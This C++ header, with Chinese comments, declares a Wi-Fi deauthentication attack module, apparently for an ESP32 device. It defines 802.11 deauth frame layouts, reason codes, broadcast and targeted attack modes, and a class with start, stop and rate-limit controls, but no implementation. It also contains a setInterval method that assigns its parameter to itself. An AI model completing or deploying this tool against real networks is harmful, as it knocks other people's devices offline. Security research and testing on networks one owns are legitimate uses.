/**
 * @file deauth.h
 * @brief Deauthentication Attack Module
 * 
 * Deauthentication 攻击模块
 * 用于发送 Deauth 帧强制客户端断开连接
 */

#ifndef DEAUTH_H
#define DEAUTH_H

#include "config.h"

// ==================== Deauth 帧结构 ====================

struct DeauthFrame {
    // Frame Control
    uint8_t fc[2];           // 0xC0 0x00 (Deauth)
    uint16_t duration;
    uint8_t destination[6];
    uint8_t source[6];
    uint8_t bssid[6];
    uint16_t seqCtrl;
    // Fixed Parameters
    uint16_t reasonCode;
} __attribute__((packed));

// Deauth 原因代码
enum DeauthReasonCode {
    REASON_UNSPECIFIED = 1,
    REASON_PREV_AUTH_NOT_VALID = 2,
    REASON_DEAUTH_LEAVING = 3,
    REASON_DISASSOC_DUE_TO_INACTIVITY = 4,
    REASON_DISASSOC_AP_BUSY = 5,
    REASON_CLASS2_FRAME_FROM_NONAUTH_STA = 6,
    REASON_CLASS3_FRAME_FROM_NONASSOC_STA = 7,
    REASON_DISASSOC_STA_HAS_LEFT = 8,
    REASON_STA_REQ_ASSOC_WITHOUT_AUTH = 9,
    REASON_PWR_CAPABILITY_NOT_VALID = 10,
    REASON_SUPPORTED_CHANNEL_NOT_VALID = 11,
    REASON_INVALID_IE = 13,
    REASON_MIC_FAILURE = 14,
    REASON_4WAY_HANDSHAKE_TIMEOUT = 15,
    REASON_GROUP_KEY_UPDATE_TIMEOUT = 16,
    REASON_IE_IN_4WAY_DIFFERS = 17,
    REASON_INVALID_GROUP_CIPHER = 18,
    REASON_INVALID_PAIRWISE_CIPHER = 19,
    REASON_INVALID_AKMP = 20,
    REASON_UNSUPPORTED_RSN_IE_VERSION = 21,
    REASON_INVALID_RSN_IE_CAP = 22,
    REASON_IEEE_802_1X_AUTH_FAILED = 23,
    REASON_CIPHER_SUITE_REJECTED = 24
};

// ==================== 攻击模式 ====================

enum DeauthMode {
    DEAUTH_MODE_SINGLE = 0,      // 单目标
    DEAUTH_MODE_BROADCAST,       // 广播模式
    DEAUTH_MODE_BSSID,           // 针对整个 BSSID
    DEAUTH_MODE_STATION          // 针对特定 STA
};

// ==================== 类定义 ====================

class DeauthAttack {
public:
    DeauthAttack();
    ~DeauthAttack();

    // 初始化和清理
    bool begin();
    void end();

    // 目标设置
    void setTargetBSSID(const uint8_t* bssid);
    void setTargetStation(const uint8_t* station);
    void setTargetChannel(uint8_t channel);
    void setMode(DeauthMode mode);
    void setReasonCode(uint16_t reason);
    
    // 获取目标信息
    void getTargetBSSID(uint8_t* bssid) const;
    void getTargetStation(uint8_t* station) const;
    uint8_t getTargetChannel() const { return targetChannel; }
    DeauthMode getMode() const { return mode; }

    // 攻击控制
    bool startAttack();
    void stopAttack();
    bool isRunning() const { return running; }

    // 单次发送
    bool sendDeauth();
    bool sendDisassoc();
    bool sendDeauthTo(const uint8_t* dst, const uint8_t* src, const uint8_t* bssid);

    // 配置
    void setBurstCount(uint8_t count) { burstCount = count; }
    void setInterval(uint16_t intervalMs) { intervalMs = intervalMs; }
    void setMaxPackets(uint32_t max) { maxPackets = max; }
    
    // 统计
    uint32_t getSentPackets() const { return sentPackets; }
    uint32_t getFailedPackets() const { return failedPackets; }
    void resetStatistics();

    // 安全限制
    void setRateLimit(uint16_t packetsPerMinute);
    bool checkRateLimit();

    // 确认对话框 (防止误操作)
    static bool confirmAttack();

private:
    bool running;
    DeauthMode mode;
    
    // 目标
    uint8_t targetBSSID[6];
    uint8_t targetStation[6];
    uint8_t targetChannel;
    bool hasBSSID;
    bool hasStation;
    
    // 配置
    uint16_t reasonCode;
    uint8_t burstCount;
    uint16_t intervalMs;
    uint32_t maxPackets;
    
    // 统计
    uint32_t sentPackets;
    uint32_t failedPackets;
    uint32_t startTime;
    
    // 速率限制
    uint16_t rateLimitPPM;
    uint32_t lastMinuteStart;
    uint16_t packetsThisMinute;
    
    // 任务
    TaskHandle_t attackTaskHandle;
    
    // 内部方法
    static void attackTask(void* parameter);
    void runAttack();
    bool sendDeauthFrame(const uint8_t* dst, const uint8_t* src, const uint8_t* bssid);
    bool sendDisassocFrame(const uint8_t* dst, const uint8_t* src, const uint8_t* bssid);
    void buildDeauthFrame(DeauthFrame* frame, const uint8_t* dst, 
                          const uint8_t* src, const uint8_t* bssid);
    
    // 辅助函数
    bool validateTarget() const;
    void logAttack(const char* action);
};

// ==================== 全局实例 ====================
extern DeauthAttack Deauth;

// ==================== 辅助函数 ====================
const char* getDeauthReasonString(uint16_t reason);
const char* getDeauthModeString(DeauthMode mode);

#endif // DEAUTH_H
